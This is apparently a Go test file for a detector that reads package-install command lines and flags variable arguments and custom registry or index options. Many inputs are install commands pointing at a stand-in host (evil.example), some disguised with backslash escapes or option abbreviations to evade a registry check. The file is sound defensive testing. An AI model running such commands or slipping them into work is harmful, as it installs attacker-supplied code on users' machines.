package installread

import (
	"slices"
	"testing"
)

// READER-VAR-OPT-1 (ADR-0159 round 9). A word the line does not show where a package manager reads its options or
// its subcommand, and a registry, index or config option in a spelling the tool accepts, are reasons: with
// P=--registry=URL the package comes from URL while install_check judges it on the public registry. Placeholders
// zz-var-pkg only; abbreviations checked with npm 10.8.2, pip 26.2.2 and pipx 1.17.2 (2026-11-15).

// codesOn: the reason codes both readers give a line, in order.
func codesOn(line string) (targets, codes []string) {
	tg, un, _, s := ParseLine(line)
	for _, u := range un {
		codes = append(codes, UnreadCode(u))
	}
	for _, x := range HookExtra(line, tg, un, s) {
		codes = append(codes, ExtraCode(x))
	}
	return tg, codes
}

func TestReaderVarOptReasons(t *testing.T) {
	for line, code := range map[string]string{
		// a variable, a quoted variable or a parameter expansion before or between the program and the subcommand
		"npm $P i zz-var-pkg":                    "variable_argument",
		`npm "$P" install zz-var-pkg`:            "variable_argument",
		"npm ${P} i zz-var-pkg":                  "variable_argument",
		"npm ${VERBOSE:+--verbose} i zz-var-pkg": "variable_argument",
		"npm $A $B i zz-var-pkg":                 "variable_argument",
		"npm --loglevel=warn $P i zz-var-pkg":    "variable_argument",
		"npm -w web $P i zz-var-pkg":             "variable_argument",
		"npm --$P i zz-var-pkg":                  "variable_argument",
		"npm i --$P zz-var-pkg":                  "variable_argument",
		// a backslash before an ordinary character is dropped by the shell, so the reader sees the real option: a custom
		// registry, a more exact reason than the old generic variable_argument; both hold (READER-ESCAPE-1)
		"npm --re\\gistry=https://evil.example i zz-var-pkg": "custom_registry",
		"npm --regis\\try=https://evil.example i zz-var-pkg": "custom_registry",
		"npm i zz-var-pkg --re\\gistry=https://evil.example": "custom_registry",
		"npm $P exec zz-var-pkg":                             "variable_argument",
		"npm $P create zz-var-pkg":                           "variable_argument",
		"npm $P init zz-var-pkg":                             "variable_argument",
		"pnpm $P add zz-var-pkg":                             "variable_argument",
		"pnpm $P dlx zz-var-pkg":                             "variable_argument",
		"yarn $P add zz-var-pkg":                             "variable_argument",
		"bun $P add zz-var-pkg":                              "variable_argument",
		"bun $P x zz-var-pkg":                                "variable_argument",
		"sudo npm $P i zz-var-pkg":                           "variable_argument",
		"pip $P install zz-var-pkg":                          "variable_argument",
		`pip3 "$P" install zz-var-pkg`:                       "variable_argument",
		"python3 -m pip $P install zz-var-pkg":               "variable_argument",
		"pip --cache-dir /c $P install zz-var-pkg":           "variable_argument",
		"uv $P pip install zz-var-pkg":                       "variable_argument",
		"uv pip $P install zz-var-pkg":                       "variable_argument",
		"uv $P add zz-var-pkg":                               "variable_argument",
		"uv tool $P install zz-var-pkg":                      "variable_argument",
		"pip install --$P zz-var-pkg":                        "variable_argument",
		"pipx install zz-var-pkg --pip-args=\"$PA\"":         "variable_argument",
		// npm's abbreviations of its config-file options
		"npm i zz-var-pkg --userconf /srv/npmrc": "custom_registry",
		"npm i zz-var-pkg --userc=/srv/npmrc":    "custom_registry",
		"npm --usercon /srv/npmrc i zz-var-pkg":  "custom_registry",
		"npm i zz-var-pkg --globalc /srv/npmrc":  "custom_registry",
		"npm i zz-var-pkg --globalconf=/srv/rc":  "custom_registry",
		"npx --userconf /srv/npmrc zz-var-pkg":   "custom_registry",
		"pnpm add zz-var-pkg --userconf /srv/rc": "custom_registry",
		"npm i zz-var-pkg --USERCONFIG /srv/rc":  "custom_registry", // as today: a name in capitals counts
		// pip's abbreviations (optparse) and short options with the value attached or in a cluster
		"pip install --in https://evil.example/simple zz-var-pkg":          "custom_registry",
		"pip install --index-u=https://evil.example/simple zz-var-pkg":     "custom_registry",
		"pip install --ext https://evil.example/simple zz-var-pkg":         "custom_registry",
		"pip install --extra-index=https://evil.example/simple zz-var-pkg": "custom_registry",
		"pip install --fi https://evil.example/links zz-var-pkg":           "custom_registry",
		"pip install --find-link=/srv/wheels zz-var-pkg":                   "custom_registry",
		"pip install -ihttps://evil.example/simple zz-var-pkg":             "custom_registry",
		"pip install -Ui https://evil.example/simple zz-var-pkg":           "custom_registry",
		"pip install -qihttps://evil.example/simple zz-var-pkg":            "custom_registry",
		"pip install -fhttps://evil.example/links zz-var-pkg":              "custom_registry",
		"pip3 install -Uf /srv/wheels zz-var-pkg":                          "custom_registry",
		"uv pip install -ihttps://evil.example/simple zz-var-pkg":          "custom_registry",
		// pipx: its own --index-url by abbreviation and attached, and pip's options inside --pip-args in every spelling
		"pipx install zz-var-pkg --pip-args='--index-url=https://evil.example/simple'":        "custom_registry",
		"pipx install zz-var-pkg --pip-args '--index-url https://evil.example/simple'":        "custom_registry",
		"pipx install zz-var-pkg --pip-args='-i https://evil.example/simple'":                 "custom_registry",
		"pipx install zz-var-pkg --pip-args=-ihttps://evil.example/simple":                    "custom_registry",
		"pipx install zz-var-pkg --pip-args='--pre --extra-index-url https://evil.example/s'": "custom_registry",
		"pipx install zz-var-pkg --pip-args='--in https://evil.example/simple'":               "custom_registry",
		"pipx install zz-var-pkg --pip-args='--find-links /srv/wheels'":                       "custom_registry",
		"pipx install zz-var-pkg --pip-a='--index-url=https://evil.example/simple'":           "custom_registry",
		"pipx install zz-var-pkg --pi='--index-url=https://evil.example/simple'":              "custom_registry",
		"pipx run --pip-args='-i https://evil.example/simple' zz-var-pkg":                     "custom_registry",
		"pipx install --ind https://evil.example/simple zz-var-pkg":                           "custom_registry",
		"pipx install --index-u=https://evil.example/simple zz-var-pkg":                       "custom_registry",
		"pipx install -ihttps://evil.example/simple zz-var-pkg":                               "custom_registry",
		"pipx install zz-var-pkg --pip-args='git+https://evil.example/x.git'":                 "git_or_url",
		"pipx install -e git+https://evil.example/x.git":                                      "git_or_url", // -e takes no value
		"pip3 install --ext https://evil.example/simple zz-var-pkg":                           "custom_registry",
		"npm -- $P i zz-var-pkg": "variable_argument",
		"pipx install zz-var-pkg --pip-args='--proxy=http://p;x -i https://evil.example/s'": "custom_registry", // ; is shlex's
		"pipx install -fihttps://evil.example/simple zz-var-pkg":                            "custom_registry", // -f is --force
		"npm i zz-var-pkg --USERCONF=/srv/rc":                                               "custom_registry",
		"npm -$P i zz-var-pkg":                                                              "variable_argument",
		"uvx --refresh-package oldpkg $P zzbin":                                             "variable_argument", // --refresh-package took a value
		"uvx -p 3.12 --from zz-var-pkg $P zzbin":                                            "variable_argument", // -p is a short value option
		"uvx --exclude-newer 2024-01-01 --from zz-var-pkg $P bin":                           "variable_argument", // --exclude-newer is a uv-only value option
		"npm -reg https://evil.example/ create zz-var-pkg":                                  "custom_registry",   // one-dash before the subcommand
	} {
		tg, codes := codesOn(line)
		if !slices.Contains(codes, code) {
			t.Errorf("%q: codes %v (targets %v), want %s", line, codes, tg, code)
		}
	}
}

// Lines that stay what they were: options the tools read with no registry, a variable as a known option's value
// (the folder or workspace an option names is read as today: no reason), the public registry, pipx's -f and -e
// (--force and --editable, not pip's find-links and editable with a value).
func TestReaderVarOptPlain(t *testing.T) {
	for line, want := range map[string][]string{
		"npm i -D zz-var-pkg":                                                 {"npm:zz-var-pkg"},
		"npm --save-dev i zz-var-pkg":                                         {"npm:zz-var-pkg"},
		"npm i -g zz-var-pkg":                                                 {"npm:zz-var-pkg"},
		"npm --global i zz-var-pkg":                                           {"npm:zz-var-pkg"},
		"npm i zz-var-pkg --user-agent zz":                                    {"npm:zz-var-pkg"},
		"npm i zz-var-pkg --registry=https://registry.npmjs.org":              {"npm:zz-var-pkg"},
		"npm -w web i zz-var-pkg":                                             {"npm:zz-var-pkg"},
		`npm -w "$WS" i zz-var-pkg`:                                           {"npm:zz-var-pkg"},
		`npm --prefix "$DIR" i zz-var-pkg`:                                    {"npm:zz-var-pkg"},
		`npm --loglevel=$LVL i zz-var-pkg`:                                    {"npm:zz-var-pkg"},
		`pnpm --filter "$PKG" add zz-var-pkg`:                                 {"npm:zz-var-pkg"},
		`pnpm -F $PKG add zz-var-pkg`:                                         {"npm:zz-var-pkg"},
		`yarn --cwd "$D" add zz-var-pkg`:                                      {"npm:zz-var-pkg"},
		`yarn workspace "$WS" add zz-var-pkg`:                                 {"npm:zz-var-pkg"},
		`bun --cwd $D add zz-var-pkg`:                                         {"npm:zz-var-pkg"},
		"pip install -U zz-var-pkg":                                           {"pypi:zz-var-pkg"},
		"pip install -qU zz-var-pkg":                                          {"pypi:zz-var-pkg"},
		"pip install --user zz-var-pkg":                                       {"pypi:zz-var-pkg"},
		"pip install --upgrade zz-var-pkg":                                    {"pypi:zz-var-pkg"},
		"pip install --ignore-installed zz-var-pkg":                           {"pypi:zz-var-pkg"},
		"pip install --no-index zz-var-pkg":                                   {"pypi:zz-var-pkg"},
		"pip install -i https://pypi.org/simple zz-var-pkg":                   {"pypi:zz-var-pkg"},
		"pip install -ihttps://pypi.org/simple zz-var-pkg":                    {"pypi:zz-var-pkg"},
		"pip install --in https://pypi.org/simple zz-var-pkg":                 {"pypi:zz-var-pkg"},
		`pip --cache-dir "$D" install zz-var-pkg`:                             {"pypi:zz-var-pkg"},
		"pip -q install zz-var-pkg":                                           {"pypi:zz-var-pkg"},
		`python3 -m pip --python "$PY" install zz-var-pkg`:                    {"pypi:zz-var-pkg"},
		`uv --directory "$D" add zz-var-pkg`:                                  {"pypi:zz-var-pkg"},
		`uv --project $P pip install zz-var-pkg`:                              {"pypi:zz-var-pkg"},
		"uv pip install --extra-index-url https://pypi.org/simple zz-var-pkg": {"pypi:zz-var-pkg"},
		"uv pip install --ext zz-var-pkg":                                     {"pypi:zz-var-pkg"}, // uv's clap takes no abbreviation: not an index option
		"pipx install zz-var-pkg --pip-args=--pre":                            {"pypi:zz-var-pkg"},
		"pipx install zz-var-pkg --pip-args='--no-cache-dir --pre'":           {"pypi:zz-var-pkg"},
		"pipx install zz-var-pkg --pip-args='--no-binary :all:'":              {"pypi:zz-var-pkg"},
		"pipx install zz-var-pkg --pip-args='-i https://pypi.org/simple'":     {"pypi:zz-var-pkg"},
		"pipx install -f zz-var-pkg":                                          {"pypi:zz-var-pkg"},
		"pipx install --force zz-var-pkg":                                     {"pypi:zz-var-pkg"},
		"pipx install --include-deps zz-var-pkg":                              {"pypi:zz-var-pkg"},
		"pipx install -fq zz-var-pkg":                                         {"pypi:zz-var-pkg"},
		"pip install -Ui https://pypi.org/simple zz-var-pkg":                  {"pypi:zz-var-pkg"},
		"npm i -Df zz-var-pkg":                                                {"npm:zz-var-pkg"},  // npm's -f forces
		"pip install -tC:\\libs zz-var-pkg":                                   {"pypi:zz-var-pkg"}, // a value attached to -t
		"pip install --target C:\\libs zz-var-pkg":                            {"pypi:zz-var-pkg"},
		"uv tool install --python 3.12 zz-var-pkg":                            {"pypi:zz-var-pkg"},
		"uv pip install -ei/tmp/x zz-var-pkg":                                 {"pypi:zz-var-pkg"}, // uv pip install -e takes a value
		"uv pip install -e./local -i https://pypi.org/simple zz-var-pkg":      {"pypi:zz-var-pkg"},
		`uv run --with ok-pkg "$script"`:                                      {"pypi:ok-pkg"}, // "$script" is the command uv runs
		`uvx --from ok-pkg "$x"`:                                              {"pypi:ok-pkg"}, // the hidden word is the command, not an option before it
		`pipx run --spec ok-pkg "$app"`:                                       {"pypi:ok-pkg"},
		// an option's value is never read as a package (pyOptions; the server read --upgrade-strategy's "eager")
		"pip install zz-var-pkg --upgrade-strategy eager":                {"pypi:zz-var-pkg"},
		"pip install zz-var-pkg --progress-bar off":                      {"pypi:zz-var-pkg"},
		"pip install zz-var-pkg --root /tmp/r --src /tmp/s":              {"pypi:zz-var-pkg"},
		"pip install zz-var-pkg -C setting":                              {"pypi:zz-var-pkg"},
		"pip install zz-var-pkg --config-settings editable_mode=compat":  {"pypi:zz-var-pkg"},
		"pip install zz-var-pkg --no-binary :all: --only-binary numpy":   {"pypi:zz-var-pkg"},
		"uv pip install zz-var-pkg --link-mode copy --resolution lowest": {"pypi:zz-var-pkg"},
		"pipx run --python-args=-Xutf8 zz-var-pkg":                       {"pypi:zz-var-pkg"},
		"pipx install zz-var-pkg --suffix dev --cooldown 7":              {"pypi:zz-var-pkg"},
		"npm i zz-var-pkg --prefix=C:\\app":                              {"npm:zz-var-pkg"},
	} {
		tg, codes := codesOn(line)
		if len(codes) > 0 || !slices.Equal(tg, want) {
			t.Errorf("%q: targets %v, codes %v; want %v and no reason", line, tg, codes, want)
		}
	}
	// No install the line shows: as silent as before (the program or the subcommand comes from a variable).
	for _, line := range []string{"npm $P", "npm $P zz-var-pkg", "npm run $SCRIPT", "npm $P run build", "$CMD i zz-var-pkg",
		"npm ${VERBOSE:+--verbose} run build", "pipx install -e .", "pip install -rrequirements-dev.txt"} {
		if tg, codes := codesOn(line); len(tg)+len(codes) > 0 {
			t.Errorf("%q: targets %v, codes %v; want none", line, tg, codes)
		}
	}
}

// shlexWords against Python 3.14's shlex.split(v.strip("'"), posix=True), as pipx 1.17 splits --pip-args (outputs
// taken from Python on 2026-11-15; a differential run of 1,677 inputs agreed).
func TestReaderVarOptShlexWords(t *testing.T) {
	for in, want := range map[string][]string{
		"--index-url https://e.example/s":    {"--index-url", "https://e.example/s"},
		"'--pre --no-deps'":                  {"--pre", "--no-deps"},
		"--proxy=a;b -i https://e.example/s": {"--proxy=a;b", "-i", "https://e.example/s"},
		"--pre #x -i https://e.example/s":    {"--pre", "#x", "-i", "https://e.example/s"},
		`"-i" "https://e.example/s"`:         {"-i", "https://e.example/s"},
		`-i\ x`:                              {"-i x"},
		`"a\"b" c`:                           {`a"b`, "c"},
		`"a\nb"`:                             {`a\nb`},
		`x'a'"b"c`:                           {"xabc"},
		`a\'b`:                               {"a'b"},
		"  a   b  ":                          {"a", "b"},
		"a|b&c(d)<e>":                        {"a|b&c(d)<e>"},
		`--cert=a\\b`:                        {`--cert=a\b`},
		"x\ty\nz":                            {"x", "y", "z"},
		"''":                                 nil,
	} {
		if got := shlexWords(in); !slices.Equal(got, want) {
			t.Errorf("%q: %q, want %q", in, got, want)
		}
	}
}
